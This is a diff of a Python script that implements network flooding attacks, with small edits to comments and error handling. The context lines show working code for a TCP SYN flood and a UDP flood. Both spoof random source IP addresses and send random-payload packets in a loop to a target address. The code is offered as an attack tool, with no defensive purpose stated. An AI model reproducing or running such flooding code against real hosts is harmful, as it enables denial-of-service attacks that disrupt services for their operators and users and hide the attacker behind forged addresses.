@@ -61,6 +61,7 @@ else: exit("Check the code to see how you configure it")
 
 stop = threading.Event()
 
+
 #-- attack types --#
 
 #do a tcp syn flood attack
@@ -69,7 +70,7 @@ def tcp_flood(thread):
     port = 3703
     while not stop.is_set():
         if not lock_port: port = random.randint(0, 9999) #if lock_port is False, generate a random port (idk why i added this)
-        payload = os.urandom(payload_size) #create a payload of payload_size with random contents
+        payload = os.urandom(payload_size) #create a payload with random contents
         source = f"{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}" #generate a random source ip
         packet = IP(src = source, dst = dest_ip) / TCP(dport = port, flags = 'S') / Raw(load = payload) #create a packet with a spoofed ip
         try:send(packet, verbose=False) #send the packet
@@ -101,7 +102,8 @@ def udp_flood(thread):
         payload = os.urandom(payload_size)
         source = f"{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
         packet = IP(src = source, dst = dest_ip) / UDP(dport=port) / Raw(load = payload)
-        send(packet, verbose=False)
+        try: send(packet, verbose=False)
+        except Exception as e: print(e)
         tsize += payload_size
         if doprint: print(f"[UDP] PAYLOAD {payload_size} TO {dest_ip} THREAD {thread}")
         sleep(0)
